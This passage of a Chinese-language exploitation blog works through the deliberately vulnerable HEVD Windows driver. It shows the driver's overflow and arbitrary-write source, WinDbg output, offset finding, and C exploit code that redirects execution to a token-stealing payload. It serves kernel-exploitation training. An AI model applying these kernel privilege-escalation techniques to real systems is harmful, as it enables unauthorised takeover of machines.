class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UserBuffer Size: 0x%X\n&quot;</span>, Size);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, &amp;KernelBuffer);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] KernelBuffer Size: 0x%X\n&quot;</span>, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SECURE</span></span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer));<span class="comment">//安全版本</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] Triggering Buffer Overflow in Stack (GS)\n&quot;</span>);</span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);<span class="comment">//不安全版本，未对size做限制</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = GetExceptionCode();</span><br><span class="line">        DbgPrint(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>ebp与sehandler偏移为0xC，确定下KernelBuffer的地址，然后ebp-0xC-KernelBuffer就可以确定偏移了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; bp HEVD!TriggerBufferOverflowStackGS</span><br><span class="line">kd&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line">HEVD!TriggerBufferOverflowStackGS:</span><br><span class="line">ac51a2a6 <span class="number">6810020000</span>      push    <span class="number">210</span>h</span><br><span class="line">kd&gt; r</span><br><span class="line">eax=<span class="number">0000020</span>e ebx=<span class="number">878b</span>b7f0 ecx=c0000001 edx=<span class="number">003</span>d3bd0 esi=<span class="number">83f</span>1817c edi=<span class="number">878b</span>b780</span><br><span class="line">eip=ac51a2a6 esp=<span class="number">8b</span>47fab4 ebp=<span class="number">8b</span>47fac0 iopl=<span class="number">0</span>         nv up ei pl nz na po nc</span><br><span class="line">cs=<span class="number">0008</span>  ss=<span class="number">0010</span>  ds=<span class="number">0023</span>  es=<span class="number">0023</span>  fs=<span class="number">0030</span>  gs=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">HEVD!TriggerBufferOverflowStackGS:</span><br><span class="line">ac51a2a6 <span class="number">6810020000</span>      push    <span class="number">210</span>h</span><br><span class="line">    </span><br><span class="line"><span class="number">8b</span>47f894</span><br><span class="line">    <span class="number">8b</span>47fab0</span><br></pre></td></tr></table></figure>



<h2 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h2><p>这里有两种方法：</p>
<ul>
<li>随机字符串</li>
</ul>
<p>生成一段随机字符串：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./pattern_create.rb -l 1000</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B</span><br></pre></td></tr></table></figure>

<p>测试程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *shellcode = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B&quot;</span>;</span><br><span class="line"><span class="type">int</span> shellcodeLength = <span class="built_in">strlen</span>(shellcode);</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hDevice = ::CreateFileW(<span class="string">L&quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>, GENERIC_ALL, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, <span class="number">0</span>, nullptr);</span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[ERROR]Open Device Error\r\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[INFO]Device Handle: 0x%X\n&quot;</span>, hDevice);</span><br><span class="line">    &#125;</span><br><span class="line">    ULONG WriteRet = <span class="number">0</span>;</span><br><span class="line">    DeviceIoControl(hDevice, <span class="number">0x222007</span>, (LPVOID)shellcode, shellcodeLength, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;WriteRet, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行之后报错，查看寄存器：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">KDTARGET: Refreshing KD connection</span><br><span class="line">Access violation - code c0000005 (!!! second chance !!!)</span><br><span class="line">73413173 ??              ???</span><br><span class="line">kd&gt; r</span><br><span class="line">eax=00000000 ebx=97e25988 ecx=0fe2dc3f edx=00000000 esi=83f0217c edi=97e25918</span><br><span class="line">eip=73413173 esp=af973ac0 ebp=41307341 iopl=0         nv up ei ng nz ac po nc</span><br><span class="line">cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010292</span><br><span class="line">73413173 ??              ???</span><br></pre></td></tr></table></figure>

<p>eip指向73413173，判断该值的位置：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./pattern_offset.rb -q 73413173 -l 1000</span><br><span class="line">[*] Exact match at offset 544</span><br></pre></td></tr></table></figure>

<p>修改代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    ULONG UserBufferSize = <span class="number">544</span>+<span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    HANDLE hDevice = ::CreateFileW(<span class="string">L&quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>, GENERIC_ALL, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, <span class="number">0</span>, nullptr);</span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[ERROR]Open Device Error\r\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[INFO]Device Handle: 0x%X\n&quot;</span>, hDevice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PULONG UserBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);</span><br><span class="line">    <span class="keyword">if</span> (!UserBuffer) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[ERROR]Allocate ERROR&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[INFO]Allocated Memory: 0x%p\n&quot;</span>, UserBuffer);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[INFO]Allocation Size: 0x%X\n&quot;</span>, UserBufferSize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RtlFillMemory(UserBuffer, UserBufferSize, <span class="number">0x41</span>);</span><br><span class="line"></span><br><span class="line">    PVOID MemoryAddress = (PVOID)(((ULONG)UserBuffer + UserBufferSize)-<span class="keyword">sizeof</span>(ULONG));</span><br><span class="line">   *(PULONG)MemoryAddress = (ULONG)<span class="number">0x66666666</span>;</span><br><span class="line"></span><br><span class="line">    ULONG WriteRet = <span class="number">0</span>;</span><br><span class="line">    DeviceIoControl(hDevice, <span class="number">0x222007</span>, (LPVOID)UserBuffer, UserBufferSize, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;WriteRet, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    HeapFree(GetProcessHeap(), <span class="number">0</span>, (LPVOID)UserBuffer);</span><br><span class="line">    UserBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看寄存器：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; r</span><br><span class="line">eax=00000000 ebx=8790dfd8 ecx=076f487e edx=00000000 esi=83ec817c edi=8790df68</span><br><span class="line">eip=66666666 esp=aed81ac0 ebp=41414141 iopl=0         nv up ei ng nz ac po nc</span><br><span class="line">cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010292</span><br><span class="line">66666666 ??              ???</span><br></pre></td></tr></table></figure>

<p>可以看到成功控制eip</p>
<ul>
<li>调试判断</li>
</ul>
<p>嘶，，还是有问题啊，应该是0x21C的，但是为啥21C成不了，224可以</p>
<h2 id="构造shellcode"><a href="#构造shellcode" class="headerlink" title="构造shellcode"></a>构造shellcode</h2><p>其他的和上一个一样：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ULONG UserBufferSize = <span class="number">0x224</span>;</span><br><span class="line">HANDLE hDevice = CreateFileA(<span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>,</span><br><span class="line">	GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">	FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">	<span class="literal">NULL</span>,</span><br><span class="line">	OPEN_EXISTING,</span><br><span class="line">	FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line">	<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[ERROR]Open Device Error\r\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">PULONG UserBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);</span><br><span class="line"><span class="keyword">if</span> (!UserBuffer) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[ERROR]Allocate ERROR&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">RtlFillMemory(UserBuffer, UserBufferSize, <span class="number">0x41</span>);</span><br><span class="line">PVOID MemoryAddress = (PVOID)(((ULONG)UserBuffer + UserBufferSize) - <span class="keyword">sizeof</span>(ULONG));</span><br><span class="line">*(PDWORD)MemoryAddress = (DWORD)&amp;TokenStealingPayloadWin7;</span><br><span class="line"></span><br><span class="line">ULONG WriteRet = <span class="number">0</span>;</span><br><span class="line">DeviceIoControl(hDevice, <span class="number">0x222007</span>, (LPVOID)UserBuffer, UserBufferSize, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;WriteRet, <span class="literal">NULL</span>);</span><br><span class="line">HeapFree(GetProcessHeap(), <span class="number">0</span>, (LPVOID)UserBuffer);</span><br></pre></td></tr></table></figure>



<h1 id="4-ArbitraryOverwrite-TriggerArbitraryWrite"><a href="#4-ArbitraryOverwrite-TriggerArbitraryWrite" class="headerlink" title="4.ArbitraryOverwrite-TriggerArbitraryWrite"></a>4.ArbitraryOverwrite-TriggerArbitraryWrite</h1><h2 id="任意地址写原理"><a href="#任意地址写原理" class="headerlink" title="任意地址写原理"></a>任意地址写原理</h2><p>在内核态中调用指针时要注意变量所处于的地址是否是可访问的地址，如果不是可访问的地址很可能会导致蓝屏，检查地址参数地址是否可访问一般调用函数<code>ProbeForRead</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ProbeForRead</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] <span class="type">const</span> <span class="keyword">volatile</span> VOID *Address,<span class="comment">//指定用户模式缓冲区的开头</span></span></span><br><span class="line"><span class="params">  [in] SIZE_T              Length,<span class="comment">//指定用户模式缓冲区的长度（以字节为单位）</span></span></span><br><span class="line"><span class="params">  [in] ULONG               Alignment<span class="comment">//指定用户模式缓冲区开头所需的对齐方式（以字节为单位）</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>



<p>利用：</p>
<ul>
<li>前提：假设存在2个没有验证地址的指针，那么就可能存在任意地址写入</li>
<li>利用：对这2个指针一个指向准备被写入的内核地址，一个是指向存在用户层的shellcode，然后某个内核函数中存在call这个地址的指令</li>
</ul>
<p>漏洞函数在：<code>HackSysExtremeVulnerableDriver-3.00\Driver\HEVD\ArbitraryWrite</code></p>
<p><code>*(Where) = *(What)</code>即为任意地址写漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">TriggerArbitraryWrite</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PWRITE_WHAT_WHERE UserWriteWhatWhere)</span></span><br><span class="line">&#123;</span><br><span class="line">    PULONG_PTR What = <span class="literal">NULL</span>;</span><br><span class="line">    PULONG_PTR Where = <span class="literal">NULL</span>;</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">    PAGED_CODE();</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Verify if the buffer resides in user mode</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        ProbeForRead((PVOID)UserWriteWhatWhere, <span class="keyword">sizeof</span>(WRITE_WHAT_WHERE), (ULONG) __alignof(UCHAR));</span><br><span class="line">        What = UserWriteWhatWhere-&gt;What;</span><br><span class="line">        Where = UserWriteWhatWhere-&gt;Where;</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UserWriteWhatWhere: 0x%p\n&quot;</span>, UserWriteWhatWhere);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] WRITE_WHAT_WHERE Size: 0x%zX\n&quot;</span>, <span class="keyword">sizeof</span>(WRITE_WHAT_WHERE));</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UserWriteWhatWhere-&gt;What: 0x%p\n&quot;</span>, What);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UserWriteWhatWhere-&gt;Where: 0x%p\n&quot;</span>, Where);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SECURE</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Secure Note: This is secure because the developer is properly validating if address</span></span><br><span class="line">        <span class="comment">// pointed by &#x27;Where&#x27; and &#x27;What&#x27; value resides in User mode by calling ProbeForRead()/</span></span><br><span class="line">        <span class="comment">// ProbeForWrite() routine before performing the write operation</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        ProbeForRead((PVOID)What, <span class="keyword">sizeof</span>(PULONG_PTR), (ULONG) __alignof(UCHAR));</span><br><span class="line">        ProbeForWrite((PVOID)Where, <span class="keyword">sizeof</span>(PULONG_PTR), (ULONG) __alignof(UCHAR));</span><br><span class="line">        *(Where) = *(What);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] Triggering Arbitrary Write\n&quot;</span>);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Vulnerability Note: This is a vanilla Arbitrary Memory Overwrite vulnerability</span></span><br><span class="line">        <span class="comment">// because the developer is writing the value pointed by &#x27;What&#x27; to memory location</span></span><br><span class="line">        <span class="comment">// pointed by &#x27;Where&#x27; without properly validating if the values pointed by &#x27;Where&#x27;</span></span><br><span class="line">        <span class="comment">// and &#x27;What&#x27; resides in User mode</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        *(Where) = *(What);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = GetExceptionCode();</span><br><span class="line">        DbgPrint(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>_WRITE_WHAT_WHERE</code>结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">WRITE_WHAT_WHERE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PULONG_PTR What;</span><br><span class="line">    PULONG_PTR Where;</span><br><span class="line">&#125; WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;</span><br></pre></td></tr></table></figure>

<p>所以先构造一个大小为8的buf，修改what和where指针，实现任意地址写</p>
<p>测试代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">WRITE_WHAT_WHERE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PULONG_PTR What;</span><br><span class="line">    PULONG_PTR Where;</span><br><span class="line">&#125; WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    PWRITE_WHAT_WHERE Buffer;</span><br><span class="line">    Buffer = (WRITE_WHAT_WHERE*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(WRITE_WHAT_WHERE));</span><br><span class="line">    ZeroMemory(Buffer, <span class="keyword">sizeof</span>(WRITE_WHAT_WHERE));</span><br><span class="line">    Buffer-&gt;Where = (PULONG_PTR)<span class="number">0x41414141</span>;</span><br><span class="line">    Buffer-&gt;What = (PULONG_PTR)<span class="number">0x41414141</span>;</span><br><span class="line">    DWORD recvBuf;</span><br><span class="line">    <span class="comment">// 获取句柄</span></span><br><span class="line">    HANDLE hDevice = CreateFileA(<span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>,</span><br><span class="line">        GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_EXISTING,</span><br><span class="line">     